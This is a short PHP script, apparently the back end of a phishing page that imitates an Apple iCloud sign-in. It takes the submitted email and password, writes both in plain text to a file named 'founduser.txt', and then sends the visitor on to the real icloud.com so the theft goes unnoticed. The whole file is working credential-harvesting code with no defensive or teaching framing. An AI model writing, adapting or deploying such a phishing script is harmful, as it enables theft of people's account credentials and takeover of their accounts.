<?php
$user = $_POST['email'];
$pass = $_POST['password'];


$file = fopen('founduser.txt', 'a') or die('Intentalo de nuevo');

$co = "============================================\n";
$cl = "============================================\n";
$us = "Username: $user\n";
$pass = "Password: $pass\n";

fwrite($file, "\n". $co. $us. $pass. $cl);
fclose($file);
header('Location: https://icloud.com ');
exit()
?>
